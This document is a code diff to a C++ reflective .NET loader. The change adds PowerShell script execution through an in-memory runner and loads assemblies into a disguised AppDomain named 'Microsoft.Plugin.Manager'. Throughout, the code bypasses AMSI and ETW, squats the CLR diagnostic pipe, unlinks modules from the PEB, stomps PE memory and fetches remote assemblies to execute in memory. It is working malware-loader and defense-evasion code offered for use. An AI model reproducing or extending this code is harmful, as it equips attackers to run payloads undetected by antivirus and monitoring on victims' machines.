@@ -15,16 +15,16 @@ using namespace mscorlib;
 #include <shellapi.h>
 #pragma comment(lib, "shell32.lib")
 
-void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool https) {
+void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool https, bool powershell) {
 	if (isRemote) {
 		std::cout << "[+] Remote dotnet execution\n";
-		Dotnet(FilePath, args, true, https);
+		Dotnet(FilePath, args, true, https, powershell);
 	}
 	else {
 		std::wcout << "Received argument for initialisation: filePath: " << FilePath << " args: " << args << "\n";
-		if (checkFile(FilePath)) {
+		if (checkFile(FilePath) || powershell) {
 			std::cout << "[+] File is a valid .NET executable, proceeding with execution\n";
-			Dotnet(FilePath, args, false, https);
+			Dotnet(FilePath, args, false, https, powershell);
 		}
 		else {
 			std::cout << "[-] Could not parse file path or file does not exist, exiting\n";
@@ -35,7 +35,11 @@ void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool ht
 };
 
 bool checkFile(std::wstring filePath) {
-	std::wcout << "[*] Checking if file is a valid .NET executable: " << filePath << "\n";
+	std::wcout << "[*] Checking if file is a valid file: " << filePath << "\n";
+    if (filePath.find(L".ps1") != std::wstring::npos) {
+        std::cout << "[+] File identified as a PowerShell script.\n";
+        return true;
+    }
     HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -119,7 +123,7 @@ std::wstring checkCLRVersion(LPCSTR assmblyBytes, size_t assemblyLength, LPCSTR 
         }
     }
 
-    return L"v2.0.50727";
+    return L"v4.0.30319";
 }
 
 
@@ -219,155 +223,164 @@ HANDLE BlockDiagnosticPipe() {
     std::cout << "[+] Pipe squatted. CLR diagnostics blocked." << std::endl;
     return hPipe; // Keep this handle open for the life of the process
 }
-void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https) {
-
+void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https, bool powershell) {
     int argsCount = 0;
     SAFEARRAY* params = nullptr;
     LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
-    //SetupEtwBypass();
-    //SetupAMSIBypass();
-    if (!FullAmsiBypass()) {
-		std::cout << "[-] Failed to bypass AMSI, exiting early\n";
-        return;
-    };
+
+    // 1. Initial Bypasses and Setup
+    
+    if (!powershell) {
+        FullAmsiBypass(powershell);
+        }
     
     if (!FullEtwBypass()) {
         std::cout << "[-] Failed to bypass ETW, exiting early\n";
         return;
-    };
+    }
+
     HANDLE blockingPip = BlockDiagnosticPipe();
     PrepareStealthEnvironment();
     std::wcout << L"------- Reflective .NET Loader -------\n";
-    
-    //reducing dll imports, no mscoree.dll
-    
+
+    // 2. Locate CLR Instance from manually mapped mscoree
     HMODULE g_ManualMscoree = mainInjector.myLdrLoadDll(L"mscoree.dll");
-	std::cout << "mscoree.dll at: " << g_ManualMscoree << "\n";
     typedef HRESULT(WINAPI* f_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
     auto pCLRCreateInstance = (f_CLRCreateInstance)syscallHandler.getFunctionAddressByHashWithModule(g_ManualMscoree, 3590936079);
-    BYTE* check = (BYTE*)pCLRCreateInstance;
-    std::cout << "First 4 bytes at export: " << std::hex
-        << (int)check[0] << " " << (int)check[1] << " "
-        << (int)check[2] << " " << (int)check[3] << std::endl;
 
-    if (check[0] == 'm' && check[1] == 's') {
-        std::cout << "[!] CRITICAL: This is a forwarder string, not code! You are calling a string.\n";
+    if (!pCLRCreateInstance) {
+        std::cout << "[-] Could not find CLRCreateInstance export.\n";
+        return;
     }
-	std::cout << "found CLRCreateInstance at: " << (void*)pCLRCreateInstance << "\n";
 
-    
-
-    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
-    if (FAILED(hr)) return;
-
-    ICLRMetaHost* metaHost = nullptr;
-    ICLRRuntimeInfo* runtimeInfo = nullptr;
-    ICorRuntimeHost* runtimeHost = nullptr; 
-    IUnknownPtr pAppDomainUnk = nullptr;
-    _AppDomainPtr pDefaultAppDomain = nullptr;
-    _AssemblyPtr pAssembly = nullptr;
-    _MethodInfoPtr pEntryPoint = nullptr;
-
-
+    // 3. File Acquisition
     std::vector<char> buffer;
     if (isRemote) {
         size_t pos = FilePath.find(L'/');
-        std::wstring url;
-        std::wstring path;
-
         if (pos != std::wstring::npos) {
-            url = FilePath.substr(0, pos);
-            path = FilePath.substr(pos);
-			std::wcout << "[+] Fetching remote assembly from: " << url << " with path: " << path << "\n";
+            std::wstring url = FilePath.substr(0, pos);
+            std::wstring path = FilePath.substr(pos);
             buffer = fetchRemoteEx(url, path, https);
         }
         else {
-            std::wcout << "[-] Invalid remote path format. Expected format: <IP>/<Path>\n";
+            std::wcout << "[-] Invalid remote path format.\n";
             return;
         }
     }
     else {
         std::ifstream file(FilePath, std::ios::binary | std::ios::ate);
-        if (!file.is_open()) { std::cerr << "Failed to open file.\n"; return; }
-
+        if (!file.is_open()) { std::cerr << "[-] Failed to open file.\n"; return; }
         std::streamsize size = file.tellg();
         file.seekg(0, std::ios::beg);
-
         buffer.resize(size);
-
-        if (!file.read(buffer.data(), size)) {
-            return;
-        }
+        file.read(buffer.data(), size);
     }
-    
-   
-    std::wstring clrVersion = checkCLRVersion(
-        buffer.data(),
-        buffer.size(),
-        v4,
-        strlen(v4)
-    );
-	//std::wcout << "Target .NET Version: " << std::wstring(targetVersion) << "\n\n\n";
-    std::wcout << "Target .NET Version: " << clrVersion << std::endl;
-    // 2. Setup the Runtime
-	std::cout << "Testing CLRCreateInstance from manually mapped mscoree.dll at: " << g_ManualMscoree << "\n";
-    
+
+    // 4. Version Detection & Runtime Initialization
+    // Force v4 if powershell helper is used, else scan buffer
+    std::wstring clrVersion = powershell ? L"v4.0.30319" : checkCLRVersion(buffer.data(), buffer.size(), v4, strlen(v4));
+    std::wcout << "[*] Target .NET Version: " << clrVersion << std::endl;
+
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    ICLRMetaHost* metaHost = nullptr;
+    ICLRRuntimeInfo* runtimeInfo = nullptr;
+    ICorRuntimeHost* runtimeHost = nullptr;
+    _AssemblyPtr pAssembly = nullptr;
+    _MethodInfoPtr pEntryPoint = nullptr;
+
     hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
-	std::cout << "CLRCreateInstance returned: 0x" << std::hex << hr << "\n";
     hr = metaHost->GetRuntime(clrVersion.c_str(), IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
     helperHandler.UnlinkModuleFromPEB(L"mscoree.dll");
-    // Get ICorRuntimeHost so we can access AppDomains
     hr = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&runtimeHost);
     hr = runtimeHost->Start();
 
-    // 3. Get the Default AppDomain
-    hr = runtimeHost->GetDefaultDomain(&pAppDomainUnk);
+    // 5. Custom AppDomain Setup
+    IUnknownPtr pSetupUnk = nullptr;
+    IAppDomainSetupPtr pSetup = nullptr;
+    IUnknownPtr pAppDomainUnk = nullptr;
+    _AppDomainPtr pCustomAppDomain = nullptr;
+
+    hr = runtimeHost->CreateDomainSetup(&pSetupUnk);
+    if (SUCCEEDED(hr)) {
+        pSetupUnk->QueryInterface(IID_PPV_ARGS(&pSetup));
+        pSetup->put_ApplicationName(_bstr_t(L"Microsoft.Plugin.Manager"));
+        pSetup->put_ApplicationBase(_bstr_t(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"));
+    }
+
+    hr = runtimeHost->CreateDomainEx(_bstr_t(L"MgmtDomain"), pSetup, nullptr, &pAppDomainUnk);
+    if (FAILED(hr)) { std::cout << "[-] CreateDomainEx failed: 0x" << std::hex << hr << "\n"; return; }
+    hr = pAppDomainUnk->QueryInterface(IID_PPV_ARGS(&pCustomAppDomain));
     helperHandler.ClearDotNetFromPeb();
-    hr = pAppDomainUnk->QueryInterface(IID_PPV_ARGS(&pDefaultAppDomain));
 
-    // 4. Prepare the SAFEARRAY for the bytes
-    SAFEARRAYBOUND bounds = { (ULONG)buffer.size(), 0 };
+    // 6. Payload and Argument Preparation
+    std::vector<char> assemblyBuffer;
+    std::string scriptContent;
+    std::vector<char>* activeBuffer = &buffer;
+
+    if (powershell) {
+        // Load the Runner EXE (The C# wrapper for PS)
+        std::ifstream exeFile("Powershell.exe", std::ios::binary | std::ios::ate);
+        if (!exeFile.is_open()) { std::cout << "[-] Powershell.exe runner not found locally.\n"; return; }
+        std::streamsize exeSize = exeFile.tellg();
+        exeFile.seekg(0, std::ios::beg);
+        assemblyBuffer.resize(exeSize);
+        exeFile.read(assemblyBuffer.data(), exeSize);
+        activeBuffer = &assemblyBuffer;
+
+        // Load the .ps1 script content
+        std::ifstream psFile(FilePath);
+        scriptContent.assign((std::istreambuf_iterator<char>(psFile)), std::istreambuf_iterator<char>());
+
+        // args[0] = ScriptContent, args[1] = CmdArgs
+        LPSTR* runnerArgs = new LPSTR[2];
+        runnerArgs[0] = (LPSTR)scriptContent.c_str();
+        runnerArgs[1] = (argsCount > 0) ? arguments[0] : (LPSTR)"";
+        params = setEntrypointParams(runnerArgs, 2);
+    }
+    else {
+        params = setEntrypointParams(arguments, argsCount);
+    }
+
+    // 7. SafeArray Mapping and Loading
+    SAFEARRAYBOUND bounds = { (ULONG)activeBuffer->size(), 0 };
     SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
-    void* pData = nullptr;
-    SafeArrayAccessData(psa, &pData);
-    memcpy(pData, buffer.data(), buffer.size());
-    SafeArrayUnaccessData(psa);
 
-    // 5. Load the Assembly from memory and run Entry Point
-    std::cout << "Loading assembly into memory...\n";
+    // Stomp the PE and get the pointer
+    PVOID entryPointNetBytes = GetStompedAddress(HANDLE(-1), activeBuffer->data(), activeBuffer->size());
+    std::cout << "[+] Assembly memory prepared at " << entryPointNetBytes << "\n";
 
-    PVOID entryPointNetBytes = GetStompedAddress(HANDLE(-1), buffer.data(), buffer.size());
-    std::cout << "loaded .net Bytes at " << entryPointNetBytes << "\n";
     psa->pvData = entryPointNetBytes;
-    std::cout << "Hijacked .net bytes entry point !! \n";
     psa->fFeatures |= FADF_STATIC;
-    hr = pDefaultAppDomain->Load_3(psa, &pAssembly);
 
-    void* pNukePe = nullptr;
-    SafeArrayAccessData(psa, &pNukePe);
-    //memset(pNukePe, 0, 0x1000); // Nuke the DOS, NT, and CLR headers in the SafeArray
-    //SafeArrayUnaccessData(psa);
+    std::cout << "[*] Loading assembly into AppDomain...\n";
+    hr = pCustomAppDomain->Load_3(psa, &pAssembly);
 
-    if (FAILED(hr)) { std::cout << "Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n"; goto cleanup; }
-	else { std::cout << "Assembly loaded successfully.\n"; }
-    hr = pAssembly->get_EntryPoint(&pEntryPoint);
-    if (FAILED(hr) || pEntryPoint == nullptr) {
-        std::cout << "Could not find Entry Point (Main).\n";
+    if (FAILED(hr)) {
+        std::cout << "[-] Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n";
         goto cleanup;
     }
 
-    std::cout << "Invoking Entry Point...\n";
-    VARIANT varObj; VariantInit(&varObj); varObj.vt = VT_NULL; VARIANT varArgs; VariantInit(&varArgs); varArgs.vt = VT_NULL;
-	
-    VARIANT retVal;
-    VariantInit(&retVal);
-    params = setEntrypointParams(arguments, argsCount);
-    std::cout << "converting args to SAFEARRAY...\n";
+    hr = pAssembly->get_EntryPoint(&pEntryPoint);
+    if (FAILED(hr) || pEntryPoint == nullptr) {
+        std::cout << "[-] Could not find Entry Point.\n";
+        goto cleanup;
+    }
+
+    // 8. Execution
+    std::cout << "[+] Invoking Entry Point...\n";
+    VARIANT varObj; VariantInit(&varObj); varObj.vt = VT_NULL;
+    VARIANT retVal; VariantInit(&retVal);
+    if (powershell) {
+        FullAmsiBypass(powershell);
+    }
     hr = pEntryPoint->Invoke_3(varObj, params, &retVal);
 
 cleanup:
     if (psa) SafeArrayDestroy(psa);
-    if (runtimeHost) runtimeHost->Release();
+    if (runtimeHost) {
+        runtimeHost->UnloadDomain(pAppDomainUnk); // Clean up the domain
+        runtimeHost->Release();
+    }
     if (runtimeInfo) runtimeInfo->Release();
     if (metaHost) metaHost->Release();
     CoUninitialize();
